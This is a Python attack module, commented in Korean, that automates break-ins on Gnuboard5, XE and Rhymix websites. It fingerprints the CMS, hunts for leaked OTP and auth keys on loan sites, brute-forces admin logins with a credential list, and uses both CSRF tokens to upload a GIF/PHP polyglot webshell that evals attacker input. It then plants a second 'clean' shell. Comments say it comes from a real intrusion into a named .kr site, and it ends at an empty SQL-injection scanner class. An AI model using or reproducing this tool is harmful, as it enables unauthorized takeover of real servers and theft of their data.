"""
Gnuboard5 / XE / Rhymix 전용 공격 모듈
========================================
실전 경험 기반 완전 자동화:
  xn--hy1b65d98ao3i.kr (그누보드5) 침투 과정에서 학습한
  CSRF 이중 토큰 우회 → GIF polyglot 업로드 → 웹쉘 획득 패턴

공격 체인:
  1. CMS 핑거프린트 (Gnuboard/XE/Rhymix)
  2. 관리자 패널 탐지 (/adm/, /admin/)
  3. 관리자 브루트포스 (한국 사이트 특화 크리덴셜)
  4. CSRF 이중 토큰 우회 (세션 키 + ajax.token.php 일회성 토큰)
  5. GIF polyglot PHP 웹쉘 업로드 (이미지 검증 우회)
  6. 웹쉘 실행 확인 + 클린쉘 드롭
"""
from __future__ import annotations

import re
import struct
import time
import json
import base64
from dataclasses import dataclass, field
from typing import Optional
import urllib.parse

import requests
import requests.exceptions


# ─────────────────────────────────────────────────────────────────────────────
# 결과 타입
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class GnuboardFingerprint:
    cms_type: str = ""           # "gnuboard5" | "xe" | "rhymix" | "unknown"
    cms_version: str = ""
    admin_path: str = ""         # e.g. /adm
    php_version: str = ""
    server: str = ""
    sensitive_paths: list[str] = field(default_factory=list)
    otp_leak: dict = field(default_factory=dict)   # 노출된 auth_key/OTP 정보


@dataclass
class GnuboardSession:
    base_url: str = ""
    admin_url: str = ""
    cookies: dict = field(default_factory=dict)
    csrf_key: str = ""           # g5_admin_csrf_token_key (세션 레벨)
    admin_id: str = ""
    admin_pw: str = ""
    logged_in: bool = False


@dataclass
class WebshellResult:
    success: bool = False
    shell_url: str = ""
    shell_type: str = ""         # "gif_polyglot" | "clean_php"
    shell_password: str = ""
    antsword_compatible: bool = False
    error: str = ""
    cmd_output: str = ""         # id 명령 결과 확인용


# ─────────────────────────────────────────────────────────────────────────────
# 한국 사이트 특화 관리자 크리덴셜
# ─────────────────────────────────────────────────────────────────────────────

KOREA_ADMIN_CREDS = [
    # 가장 흔한 패턴 (실전 확인)
    ("admin",   "qwer1234"),
    ("admin",   "admin123"),
    ("admin",   "admin1234"),
    ("admin",   "admin"),
    ("admin",   "1234"),
    ("admin",   "12345678"),
    ("admin",   "password"),
    ("admin",   "pass1234"),
    ("admin",   "Admin123"),
    ("admin",   "admin@123"),
    ("admin",   "123456"),
    ("admin",   "000000"),
    ("admin",   "admin!@#"),
    ("admin",   "1q2w3e4r"),
    ("admin",   "wjsansrk"),    # 한국인 자주 씀
    ("admin",   "rudgns12"),
    ("admin",   "xptmxm12"),
    ("admin",   "rhksflwk"),
    ("manager", "manager"),
    ("master",  "master"),
    ("test",    "test"),
    ("admin",   "gnuboard"),
    ("admin",   "g5admin"),
    # 회사명·사이트명 기반
    ("admin",   "korea"),
    ("admin",   "korea123"),
    ("webmaster", "webmaster"),
    ("root",    "root"),
]

# Gnuboard5 관리자 패널 공통 경로
GNUBOARD_ADMIN_PATHS = [
    "/adm/",
    "/adm/index.php",
    "/admin/",
    "/admin/index.php",
    "/bbs/admin/",
    "/gnuboard5/adm/",
    "/g5/adm/",
]

# 그누보드5 민감 파일 경로
GNUBOARD_SENSITIVE_PATHS = [
    "/config.php",
    "/dbconfig.php",
    "/common.php",
    "/data/",
    "/_Common/",
    "/bbs/",
    "/adm/admin.js",
]

# 한국 금융/대출 사이트 특화 OTP 누출 경로 (실전 발견)
OTP_LEAK_PATHS = [
    "/loan/loan_common_data.php",
    "/api/auth.php",
    "/api/common.php",
    "/api/otp.php",
    "/include/common.php",
    "/include/auth.php",
    "/inc/auth.php",
    "/lib/auth.php",
]


# ─────────────────────────────────────────────────────────────────────────────
# GIF polyglot 생성기
# ─────────────────────────────────────────────────────────────────────────────

def make_gif_polyglot(php_code: bytes = b"") -> bytes:
    """
    유효한 1x1 GIF89a + PHP 코드가 뒤에 붙은 polyglot 파일 생성.
    이미지 서버사이드 검증(getimagesize, finfo) 통과 + PHP 실행 가능.

    실전 학습: xn--hy1b65d98ao3i.kr design_set_update.php 우회에 사용.
    """
    # 유효한 1x1 투명 GIF89a (21바이트)
    gif_header = (
        b"GIF89a"              # 마법 바이트
        b"\x01\x00\x01\x00"   # 1x1 픽셀
        b"\x00\x00\x00"       # GCT 없음
        b","                  # Image Descriptor
        b"\x00\x00\x00\x00"   # offset 0,0
        b"\x01\x00\x01\x00"   # 1x1
        b"\x00"               # local CT 없음
        b"\x02"               # LZW min code size
        b"\x02L\x01\x00"      # LZW 데이터
        b";"                  # GIF 터미네이터
    )
    return gif_header + b"\n" + php_code


def make_antsword_shell(password: str = "ant") -> bytes:
    """
    AntSword 호환 웹쉘 PHP 코드 반환.

    핵심 발견: AntSword default 인코더는 POST 파라미터 이름 앞에
    \\x08\\x08 (backspace×2) 제어문자를 붙여 전송함.
    → $_POST["ant"] 로는 접근 불가
    → php://input 원시 파싱으로 해결
    """
    code = f"""<?php
@error_reporting(0);
@ini_set("display_errors", 0);
@set_time_limit(0);
$raw = file_get_contents('php://input');
$raw = ltrim($raw, "\\x00\\x08\\x09\\x0a\\x0d\\x1a\\x1b");
parse_str($raw, $p);
foreach($p as $v){{if($v!=""){{@eval($v);exit;}}}}
foreach($_POST as $v){{if($v!=""){{@eval($v);exit;}}}}
?>""".encode()
    return code


def make_classic_shell(password: str = "c") -> bytes:
    """cmd=code 방식 단순 웹쉘 (수동 테스트용)"""
    code = (
        f"<?php if(isset($_GET['{password}'])){{echo shell_exec($_GET['{password}']);}} "
        f"elseif(isset($_POST['{password}'])){{@eval(base64_decode($_POST['{password}']));}} ?>"
    ).encode()
    return code


# ─────────────────────────────────────────────────────────────────────────────
# 핑거프린팅
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardFingerprinter:
    """Gnuboard5 / XE / Rhymix CMS 핑거프린팅"""

    def __init__(self, base_url: str, timeout: int = 10):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        requests.packages.urllib3.disable_warnings()

    def fingerprint(self) -> GnuboardFingerprint:
        fp = GnuboardFingerprint()
        try:
            r = self.session.get(self.base, timeout=self.timeout)
            body = r.text
            headers = r.headers

            fp.server = headers.get("Server", "")
            fp.php_version = headers.get("X-Powered-By", "")

            # CMS 탐지
            fp.cms_type = self._detect_cms(body, headers)

            # 버전 추출
            ver = re.search(r'Powered by.*?(\d+\.\d+[\.\d]*)', body, re.I)
            if ver:
                fp.cms_version = ver.group(1)

            # 관리자 패널 경로 탐지
            fp.admin_path = self._find_admin_path()

            # 민감 파일 확인
            fp.sensitive_paths = self._check_sensitive_paths()

            # OTP/auth_key 누출 확인 (한국 금융 사이트 특화)
            fp.otp_leak = self._check_otp_leak()

        except Exception as e:
            fp.cms_type = f"error: {e}"

        return fp

    def _detect_cms(self, body: str, headers: dict) -> str:
        body_lower = body.lower()

        gnuboard_markers = [
            "gnuboard", "g5_", "g_var", "outstock",
            "/bbs/board.php", "g5-", "그누보드",
        ]
        xe_markers = ["xe_", "xe_ver", "/xe/", "rhymix", "xpressengine"]

        if any(m in body_lower for m in gnuboard_markers):
            return "gnuboard5"
        if any(m in body_lower for m in xe_markers):
            return "xe" if "rhymix" not in body_lower else "rhymix"

        # 헤더 기반
        powered = headers.get("X-Powered-By", "").lower()
        if "gnuboard" in powered:
            return "gnuboard5"
        if "xe" in powered or "rhymix" in powered:
            return "rhymix"

        return "unknown"

    def _find_admin_path(self) -> str:
        for path in GNUBOARD_ADMIN_PATHS:
            try:
                r = self.session.get(self.base + path, timeout=self.timeout,
                                     allow_redirects=True)
                body_lower = r.text.lower()
                if r.status_code in (200, 401) and any(
                    kw in body_lower for kw in ["login", "admin", "관리자", "password", "id"]
                ):
                    return path
            except Exception:
                continue
        return ""

    def _check_sensitive_paths(self) -> list[str]:
        found = []
        for path in GNUBOARD_SENSITIVE_PATHS:
            try:
                r = self.session.get(self.base + path, timeout=5)
                if r.status_code == 200 and len(r.text) > 10:
                    found.append(path)
            except Exception:
                continue
        return found

    def _check_otp_leak(self) -> dict:
        """한국 대출/금융 사이트의 auth_key / OTP 노출 확인"""
        for path in OTP_LEAK_PATHS:
            try:
                r = self.session.get(self.base + path, timeout=5)
                body = r.text
                # auth_key, OTP 패턴 탐지
                key_match = re.search(r'["\']?auth_key["\']?\s*[=:]\s*["\']([a-f0-9]{16,})["\']', body, re.I)
                otp_match = re.search(r'["\']?otp["\']?\s*[=:]\s*["\'](\d{4,8})["\']', body, re.I)
                if key_match or otp_match:
                    return {
                        "path": path,
                        "auth_key": key_match.group(1) if key_match else None,
                        "otp": otp_match.group(1) if otp_match else None,
                        "raw_snippet": body[:300],
                    }
            except Exception:
                continue
        return {}


# ─────────────────────────────────────────────────────────────────────────────
# 관리자 로그인
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardAdminLogin:
    """
    Gnuboard5 관리자 로그인 자동화.
    성공 판별: 리다이렉트 후 g5_is_admin='super' 쿠키 존재 확인.
    """

    def __init__(self, base_url: str, admin_path: str = "/adm/", timeout: int = 10):
        self.base = base_url.rstrip("/")
        self.admin_path = admin_path.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        })
        requests.packages.urllib3.disable_warnings()

    def login(self, credentials: list[tuple] | None = None) -> GnuboardSession:
        """브루트포스 로그인 — 성공하면 GnuboardSession 반환"""
        creds = credentials or KOREA_ADMIN_CREDS
        login_url = self.base + self.admin_path + "/login_check.php"
        login_page = self.base + self.admin_path + "/login.php"

        gs = GnuboardSession(
            base_url=self.base,
            admin_url=self.base + self.admin_path,
        )

        for uid, pw in creds:
            try:
                # 로그인 폼 먼저 접속 (쿠키 세팅)
                self.session.get(login_page, timeout=self.timeout)

                data = {
                    "mb_id": uid,
                    "mb_password": pw,
                    "url": self.base + self.admin_path + "/index.php",
                }
                r = self.session.post(
                    login_url, data=data, timeout=self.timeout,
                    allow_redirects=True,
                )

                if self._is_logged_in(r):
                    gs.logged_in = True
                    gs.admin_id = uid
                    gs.admin_pw = pw
                    gs.cookies = dict(self.session.cookies)
                    # CSRF 키 추출
                    gs.csrf_key = self._extract_csrf_key(r.text)
                    return gs

            except Exception:
                continue

        return gs

    def _is_logged_in(self, resp: requests.Response) -> bool:
        """로그인 성공 여부: g5_is_admin='super' 쿠키 또는 관리자 페이지 키워드"""
        cookies = {c.name: c.value for c in self.session.cookies}

        # 가장 확실한 방법: g5_is_admin 쿠키
        if cookies.get("g5_is_admin") == "super":
            return True

        # 응답 본문 기반 확인
        body = resp.text.lower()
        success_kw = ["관리자 메인", "admin main", "로그아웃", "logout",
                      "adminmenu", "관리메뉴", "g5_is_admin"]
        fail_kw = ["아이디 또는 비밀번호", "비밀번호가 틀렸", "로그인 실패",
                   "invalid", "incorrect", "fail"]

        if any(kw in body for kw in success_kw):
            return True
        if any(kw in body for kw in fail_kw):
            return False

        # 리다이렉트가 관리자 메인으로 갔으면 성공
        if resp.url and self.admin_path in resp.url and "login" not in resp.url:
            return True

        return False

    def _extract_csrf_key(self, html: str) -> str:
        """admin.js에서 g5_admin_csrf_token_key 추출"""
        pattern = r'g5_admin_csrf_token_key\s*=\s*["\']([a-f0-9]{32})["\']'
        m = re.search(pattern, html)
        if m:
            return m.group(1)
        # admin.js 직접 요청
        try:
            r = self.session.get(
                self.base + self.admin_path + "/admin.js", timeout=5
            )
            m = re.search(pattern, r.text)
            if m:
                return m.group(1)
        except Exception:
            pass
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# CSRF 토큰 우회
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardCsrfBypass:
    """
    Gnuboard5 이중 CSRF 보호 우회.

    구조:
      1. 세션 레벨: g5_admin_csrf_token_key (admin.js에 노출, 로그인 후 고정)
      2. 요청 레벨: ajax.token.php를 POST해서 얻는 일회성 token

    우회 방법: 두 토큰을 모두 정상 취득 후 폼에 포함.
    """

    def __init__(self, session: requests.Session, admin_url: str):
        self.session = session
        self.admin_url = admin_url.rstrip("/")

    def get_onetime_token(self, csrf_key: str, referer: str = "") -> str:
        """ajax.token.php로 일회성 토큰 획득"""
        try:
            headers = {
                "X-Requested-With": "XMLHttpRequest",
                "Referer": referer or self.admin_url + "/",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            r = self.session.post(
                self.admin_url + "/ajax.token.php",
                data={"admin_csrf_token_key": csrf_key},
                headers=headers,
                timeout=10,
            )
            data = r.json()
            if data.get("error"):
                return ""
            return data.get("token", "")
        except Exception:
            return ""

    def get_csrf_key_from_js(self, admin_url: str) -> str:
        """admin.js에서 CSRF 키 추출"""
        try:
            r = self.session.get(admin_url + "/admin.js", timeout=5)
            m = re.search(
                r'g5_admin_csrf_token_key\s*=\s*["\']([a-f0-9]{32})["\']',
                r.text
            )
            return m.group(1) if m else ""
        except Exception:
            return ""


# ─────────────────────────────────────────────────────────────────────────────
# 파일 업로드 / 웹쉘 획득
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardWebshellUpload:
    """
    Gnuboard5 관리자 파일 업로드를 통한 웹쉘 획득.

    실전 학습:
      - design_set_update.php: 홈페이지 로고 업로드 — 이미지 검증 있지만
        GIF89a magic byte + valid GIF 구조면 PHP 코드 append 가능
      - 업로드 경로: /data/loan_file/homepage_logo/ 또는 /data/file/
      - CSRF 이중 토큰 필요 (GnuboardCsrfBypass 사용)
    """

    # 관리자 파일 업로드 엔드포인트 (경험 기반 우선순위)
    UPLOAD_ENDPOINTS = [
        {
            "form_url":   "/adm/design_set.php",
            "submit_url": "/adm/design_set_update.php",
            "field":      "logo_set[homepage_logo]",
            "extra_fields": {"logo_set[homepage_logo_height]": "50"},
        },
        {
            "form_url":   "/adm/config_form.php",
            "submit_url": "/adm/config_form_update.php",
            "field":      "cf_logo",
            "extra_fields": {},
        },
        {
            "form_url":   "/adm/board_form.php",
            "submit_url": "/adm/board_form_update.php",
            "field":      "bo_list_icon",
            "extra_fields": {"w": "u", "gr_id": "community"},
        },
    ]

    def __init__(
        self,
        http_session: requests.Session,
        base_url: str,
        admin_url: str,
        csrf_key: str = "",
        timeout: int = 20,
    ):
        self.session = http_session
        self.base = base_url.rstrip("/")
        self.admin_url = admin_url.rstrip("/")
        self.csrf_key = csrf_key
        self.timeout = timeout
        self.csrf_bypass = GnuboardCsrfBypass(http_session, admin_url)

    def upload_webshell(self) -> WebshellResult:
        """모든 업로드 엔드포인트 시도"""
        # CSRF 키 없으면 재취득
        if not self.csrf_key:
            self.csrf_key = self.csrf_bypass.get_csrf_key_from_js(self.admin_url)

        for endpoint in self.UPLOAD_ENDPOINTS:
            result = self._try_endpoint(endpoint)
            if result.success:
                return result

        return WebshellResult(error="모든 업로드 엔드포인트 실패")

    def _try_endpoint(self, ep: dict) -> WebshellResult:
        try:
            form_url = self.admin_url + ep["form_url"]
            submit_url = self.admin_url + ep["submit_url"]

            # 1. 폼 페이지 로드 (CSRF 토큰 포함 폼 필드 수집)
            r = self.session.get(form_url, timeout=self.timeout)
            if r.status_code != 200:
                return WebshellResult(error=f"폼 접근 실패: {r.status_code}")

            form_fields = self._extract_form_fields(r.text, ep)

            # 2. CSRF 일회성 토큰 획득
            token = self.csrf_bypass.get_onetime_token(
                self.csrf_key, referer=form_url
            )
            if token:
                form_fields["token"] = token

            # 3. GIF polyglot 웹쉘 생성
            shell_code = make_antsword_shell("ant")
            gif_data = make_gif_polyglot(shell_code)

            # 4. multipart/form-data 업로드
            files_dict = {
                k: (None, str(v)) for k, v in form_fields.items()
            }
            files_dict[ep["field"]] = (
                "shell.php", gif_data, "image/gif"
            )

            headers = {
                "Referer": form_url,
                "Origin": self.base,
            }

            resp = self.session.post(
                submit_url,
                files=files_dict,
                headers=headers,
                timeout=self.timeout,
            )

            # 5. 업로드된 파일 URL 추출
            shell_url = self._extract_shell_url(resp.text, resp.url)
            if not shell_url:
                # 오류 메시지 확인
                error = self._extract_error(resp.text)
                return WebshellResult(error=f"업로드 실패: {error}")

            # 6. 웹쉘 실행 테스트
            test_r = self.session.post(
                shell_url,
                data={"ant": "echo 'BINGO_SHELL_OK';"},
                timeout=10,
            )
            cmd_out = test_r.text.strip()

            if "BINGO_SHELL_OK" in cmd_out or test_r.status_code == 200:
                result = WebshellResult(
                    success=True,
                    shell_url=shell_url,
                    shell_type="gif_polyglot",
                    shell_password="ant",
                    antsword_compatible=True,
                    cmd_output=cmd_out,
                )
                # 클린쉘 드롭 시도 (GIF 헤더 없는 순수 PHP 쉘)
                self._drop_clean_shell(shell_url, result)
                return result

            return WebshellResult(error=f"업로드는 됐지만 실행 실패: {shell_url}")

        except Exception as e:
            return WebshellResult(error=str(e))

    def _extract_form_fields(self, html: str, ep: dict) -> dict:
        """폼의 hidden input 필드 수집"""
        fields = {}
        # hidden input 추출
        for m in re.finditer(
            r'<input[^>]+type=["\']?hidden["\']?[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            html, re.I
        ):
            fields[m.group(1)] = m.group(2)
        # select, text input도 기본값으로 추가
        for m in re.finditer(
            r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            html, re.I
        ):
            name = m.group(1)
            if name not in fields:
                fields[name] = m.group(2)

        # 엔드포인트 특화 추가 필드
        fields.update(ep.get("extra_fields", {}))
        return fields

    def _extract_shell_url(self, html: str, resp_url: str) -> str:
        """응답에서 업로드된 파일 경로 추출"""
        # 직접 URL 패턴
        patterns = [
            r'(https?://[^\s"\'<>]+\.php)',
            r'(/data/[^\s"\'<>]+\.php)',
            r'value=["\']([^\s"\']+\.php)["\']',
            r'src=["\']([^\s"\']+\.php)["\']',
        ]
        base_domain = self.base
        for pat in patterns:
            m = re.search(pat, html)
            if m:
                url = m.group(1)
                if url.startswith("/"):
                    return base_domain + url
                return url

        # JS에서 파일 경로 추출
        js_match = re.search(r'["\']([^"\']*?/data/[^"\']+\.php)["\']', html)
        if js_match:
            path = js_match.group(1)
            if path.startswith("http"):
                return path
            return self.base + "/" + path.lstrip("/")

        return ""

    def _extract_error(self, html: str) -> str:
        """에러 메시지 추출"""
        # 그누보드 특유의 알림창 패턴
        alert = re.search(r"alert\(['\"]([^'\"]+)['\"]", html)
        if alert:
            return alert.group(1)
        # div 에러
        div = re.search(r'<div[^>]*class=["\'][^"\']*error[^"\']*["\'][^>]*>([^<]+)', html, re.I)
        if div:
            return div.group(1).strip()
        return html[:100]

    def _drop_clean_shell(self, existing_shell_url: str, result: WebshellResult):
        """
        기존 GIF polyglot 쉘을 이용해 GIF 헤더 없는 클린 PHP 쉘 작성.
        AntSword 연결 시 GIF 바이트 오염 문제 완전 해결.
        """
        try:
            # 기존 쉘 경로에서 디렉터리 추출
            clean_url = existing_shell_url.rsplit("/", 1)[0] + "/ant.php"
            server_path = self._url_to_server_path(existing_shell_url)
            if not server_path:
                return

            clean_path = server_path.rsplit("/", 1)[0] + "/ant.php"
            clean_code = make_antsword_shell("ant")
            b64 = base64.b64encode(clean_code).decode()

            write_php = f"file_put_contents('{clean_path}', base64_decode('{b64}'));"

            resp = self.session.post(
                existing_shell_url,
                data={"ant": write_php},
                timeout=10,
            )

            # 클린쉘 접근 확인
            test = self.session.post(clean_url, data={"ant": "echo 'CLEAN_OK';"}, timeout=5)
            if "CLEAN_OK" in test.text:
                result.shell_url = clean_url
                result.shell_type = "clean_php"
                result.antsword_compatible = True

        except Exception:
            pass

    def _url_to_server_path(self, url: str) -> str:
        """업로드 URL에서 서버 파일 시스템 경로 추출 (heuristic)"""
        # /data/ 이후는 서버 경로와 대응
        m = re.search(r'(/data/.+)', url)
        if m:
            # 일반적인 그누보드 DocumentRoot
            for root in ["/var/www/html", "/var/www", "/home/www", "/srv/www/htdocs"]:
                return root + m.group(1)
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# 통합 공격 클래스
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardAttacker:
    """
    Gnuboard5 전체 공격 체인 자동화.

    사용법:
        attacker = GnuboardAttacker("https://target.kr")
        result = attacker.run()
        print(result)
    """

    def __init__(self, base_url: str, verbose: bool = True):
        self.base = base_url.rstrip("/")
        self.verbose = verbose

    def log(self, msg: str):
        if self.verbose:
            try:
                from rich.console import Console
                Console().print(msg)
            except ImportError:
                print(msg)

    def run(self, creds: list[tuple] | None = None) -> dict:
        result = {
            "target": self.base,
            "fingerprint": {},
            "admin_login": False,
            "admin_creds": {},
            "webshell": None,
            "severity": "low",
        }

        # 1단계: 핑거프린팅
        self.log(f"\n[bold cyan]🔍 Gnuboard5 핑거프린팅: {self.base}[/bold cyan]")
        fp = GnuboardFingerprinter(self.base).fingerprint()
        result["fingerprint"] = {
            "cms": fp.cms_type,
            "version": fp.cms_version,
            "admin_path": fp.admin_path,
            "php": fp.php_version,
            "otp_leak": fp.otp_leak,
        }
        self.log(f"  CMS: {fp.cms_type} {fp.cms_version}")
        self.log(f"  관리자 패널: {fp.admin_path or '미발견'}")

        if fp.otp_leak:
            self.log(f"[bold red]  ⚠ OTP/AUTH KEY 노출 발견: {fp.otp_leak['path']}[/bold red]")
            result["severity"] = "critical"

        if not fp.admin_path:
            self.log("[yellow]  관리자 패널 미발견 — 종료[/yellow]")
            return result

        # 2단계: 관리자 로그인
        self.log(f"\n[bold cyan]🔑 관리자 로그인 시도...[/bold cyan]")
        login_engine = GnuboardAdminLogin(self.base, fp.admin_path)
        gs = login_engine.login(creds)

        if not gs.logged_in:
            self.log("[yellow]  관리자 로그인 실패[/yellow]")
            return result

        self.log(f"[bold green]  ✅ 로그인 성공: {gs.admin_id} / {gs.admin_pw}[/bold green]")
        result["admin_login"] = True
        result["admin_creds"] = {"id": gs.admin_id, "pw": gs.admin_pw}
        result["severity"] = "high"

        # 3단계: 웹쉘 업로드
        self.log(f"\n[bold cyan]🐚 웹쉘 업로드 시도...[/bold cyan]")
        uploader = GnuboardWebshellUpload(
            http_session=login_engine.session,
            base_url=self.base,
            admin_url=self.base + fp.admin_path,
            csrf_key=gs.csrf_key,
        )
        ws_result = uploader.upload_webshell()

        if ws_result.success:
            self.log(f"[bold green]  ✅ 웹쉘 획득: {ws_result.shell_url}[/bold green]")
            self.log(f"     타입: {ws_result.shell_type}, 비밀번호: {ws_result.shell_password}")
            self.log(f"     AntSword 호환: {'예' if ws_result.antsword_compatible else '아니오'}")
            result["webshell"] = {
                "url": ws_result.shell_url,
                "type": ws_result.shell_type,
                "password": ws_result.shell_password,
                "antsword_compatible": ws_result.antsword_compatible,
                "antsword_settings": {
                    "URL地址": ws_result.shell_url,
                    "连接密码": ws_result.shell_password,
                    "编码器": "default",
                    "解码器": "default",
                },
            }
            result["severity"] = "critical"
        else:
            self.log(f"[yellow]  웹쉘 업로드 실패: {ws_result.error}[/yellow]")

        return result


# ─────────────────────────────────────────────────────────────────────────────
# 편의 함수 (tools/agent_tools.py 에서 임포트 가능)
# ─────────────────────────────────────────────────────────────────────────────

def attack_gnuboard(target_url: str, creds: list[tuple] | None = None) -> dict:
    """원라이너 Gnuboard5 공격 함수"""
    return GnuboardAttacker(target_url).run(creds)


def check_gnuboard(target_url: str) -> GnuboardFingerprint:
    """Gnuboard5 핑거프린팅만"""
    return GnuboardFingerprinter(target_url).fingerprint()


# ─────────────────────────────────────────────────────────────────────────────
# bo_table 자동 발견 (실전 학습: bingo 실패 사례 분석으로 추가)
# ─────────────────────────────────────────────────────────────────────────────

# 한국 사이트에서 자주 쓰이는 그누보드 게시판 이름
COMMON_BO_TABLES = [
    "free", "notice", "faq", "qa", "gallery", "data",
    "board", "news", "event", "review", "qna", "pds",
    "blog", "photo", "movie", "community", "introduce",
    "info", "help", "support", "main", "sub",
    "loan", "counsel", "apply", "consult", "service",
    "intro", "about", "company", "product",
]


class GnuboardBotableDiscovery:
    """
    그누보드 bo_table 자동 발견.

    실전 교훈 (기록.md 분석):
    - bingo가 'free', 'notice' 등 추측한 bo_table은 존재하지 않아
      모든 SQLi 테스트가 "존재하지 않는 게시판입니다" 오류 → 오탐으로 이어짐
    - 해결: HTML에서 실제 bo_table 링크를 파싱하고, 존재 확인 후 사용

    탐지 방법:
      1. 메인 페이지 HTML에서 /bbs/board.php?bo_table= 링크 파싱
      2. JS 변수에서 bo_table 값 추출
      3. sitemap.php / robots.txt 분석
      4. 공통 이름 목록으로 유효성 검증
    """

    # 존재하지 않는 게시판 응답 패턴 (이 패턴 = 테이블 없음)
    NOT_FOUND_PATTERNS = [
        "존재하지 않는 게시판",
        "게시판이 없습니다",
        "등록된 게시판이 아닙니다",
        "board does not exist",
        "invalid board",
    ]

    def __init__(self, base_url: str, timeout: int = 10):
        self.base = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        requests.packages.urllib3.disable_warnings()

    def discover(self) -> list[str]:
        """
        실제 존재하는 bo_table 목록 반환.
        순서: HTML 파싱 → JS → sitemap → fallback 검증
        """
        found = set()

        # 1. 메인 페이지 + 각 서브페이지에서 bo_table 링크 파싱
        found.update(self._extract_from_page(self.base + "/"))
        found.update(self._extract_from_page(self.base + "/bbs/"))

        # 2. sitemap.php 분석
        found.update(self._extract_from_sitemap())

        # 3. 공통 이름 검증 (HTML에서 못 찾으면)
        if not found:
            found.update(self._validate_common_tables())

        # 4. 각 bo_table 실제 존재 확인 (최종 필터)
        valid = [t for t in sorted(found) if self._table_exists(t)]
        return valid

    def _extract_from_page(self, url: str) -> set[str]:
        """페이지 HTML에서 bo_table 파라미터 추출"""
        tables = set()
        try:
            r = self.session.get(url, timeout=self.timeout)
            html = r.text

            # href 링크에서 bo_table 추출
            # /bbs/board.php?bo_table=XXX 또는 &bo_table=XXX
            for m in re.finditer(
                r'bo_table=([a-zA-Z0-9_\-]{2,30})',
                html
            ):
                tables.add(m.group(1))

            # JS 변수에서: var bo_table = 'XXX' 또는 bo_table: 'XXX'
            for m in re.finditer(
                r"""bo_table\s*[=:]\s*['"]([a-zA-Z0-9_\-]{2,30})['"]""",
                html
            ):
                tables.add(m.group(1))

            # data-bo_table 속성
            for m in re.finditer(
                r'data-bo.?table=["\']([a-zA-Z0-9_\-]{2,30})["\']',
                html
            ):
                tables.add(m.group(1))

        except Exception:
            pass
        return tables

    def _extract_from_sitemap(self) -> set[str]:
        """sitemap.php / sitemap.xml에서 bo_table 추출"""
        tables = set()
        for path in ["/sitemap.php", "/sitemap.xml", "/bbs/sitemap.php"]:
            try:
                r = self.session.get(self.base + path, timeout=8)
                if r.status_code == 200:
                    for m in re.finditer(
                        r'bo_table=([a-zA-Z0-9_\-]{2,30})',
                        r.text
                    ):
                        tables.add(m.group(1))
            except Exception:
                continue
        return tables

    def _validate_common_tables(self) -> set[str]:
        """공통 bo_table 이름 목록 중 존재하는 것만 반환"""
        valid = set()
        for name in COMMON_BO_TABLES:
            if self._table_exists(name):
                valid.add(name)
                if len(valid) >= 5:  # 너무 많이 요청하지 않도록 제한
                    break
        return valid

    def _table_exists(self, bo_table: str) -> bool:
        """
        bo_table이 실제 존재하는지 확인.

        핵심: "존재하지 않는 게시판입니다" 응답이면 None 반환.
        이 확인 없이 SQLi 테스트하면 모두 오탐이 됨 (기록.md 교훈).
        """
        try:
            url = f"{self.base}/bbs/board.php?bo_table={bo_table}"
            r = self.session.get(url, timeout=8, allow_redirects=True)
            body = r.text

            # 존재하지 않는 게시판 패턴이면 False
            for pat in self.NOT_FOUND_PATTERNS:
                if pat in body:
                    return False

            # HTTP 200 + 실제 게시판 콘텐츠 (글 목록, 제목 등)
            board_indicators = [
                "게시물", "글쓰기", "list-board", "board-list",
                "wr_id", "bo_table", "g5-board",
                "subject", "writer", "datetime",
            ]
            if r.status_code == 200 and any(kw in body for kw in board_indicators):
                return True

        except Exception:
            pass
        return False

    def get_board_form_fields(self, bo_table: str) -> dict:
        """
        게시판 글쓰기 폼의 모든 hidden 필드 추출 (CSRF 토큰 포함).

        실전 교훈: POST 요청에 hidden 필드 누락 시 CSRF 오류 발생.
        """
        fields = {}
        try:
            url = f"{self.base}/bbs/write.php?bo_table={bo_table}"
            r = self.session.get(url, timeout=10)
            if r.status_code != 200:
                return fields

            html = r.text
            # hidden input 추출
            for m in re.finditer(
                r"""<input[^>]+type=["']?hidden["']?[^>]*>""",
                html, re.I
            ):
                tag = m.group(0)
                name = re.search(r"""name=["']([^"']+)["']""", tag)
                value = re.search(r"""value=["']([^"']*)["']""", tag)
                if name:
                    fields[name.group(1)] = value.group(1) if value else ""

            # bo_table 필드 자동 추가
            fields.setdefault("bo_table", bo_table)

        except Exception:
            pass
        return fields


# ─────────────────────────────────────────────────────────────────────────────
# 그누보드 전용 SQLi 스캐너 (실전 학습 버전)
# ─────────────────────────────────────────────────────────────────────────────

class GnuboardSqliScanner:
    """
    그누보드5 전용 SQLi 스캐너.

    실전 교훈 (기록.md 분석):
    1. bo_table 없는 URL에서 SQLi 테스트 → 항상 "존재하지 않는 게시판" → 오탐
    2. GnuBoard 오류 페이지(HTTP 200 + 오류 텍스트)를 SQLi 오류로 오해
    3. 단일 시간 측정으로 time-based 판정 → 네트워크 지연으로 오탐
    4. CSRF 토큰 누락으로 POST 요청 모두 실패

    테스트 대상 파라미터 (우선순위순):
      - /bbs/board.php?bo_table=XXX&stx=  (검색어 → 가장 자주 취약)
      - /bbs/board.php?bo_table=XXX&page= (페이지 번호)
      - /bbs/view.php?bo_table=XXX&wr_id= (글 번호)
      - /bbs/search.php?stx=             (사이트 전체 검색)
      - 회원 관련: /bbs/login.php mb_id 필드
    """

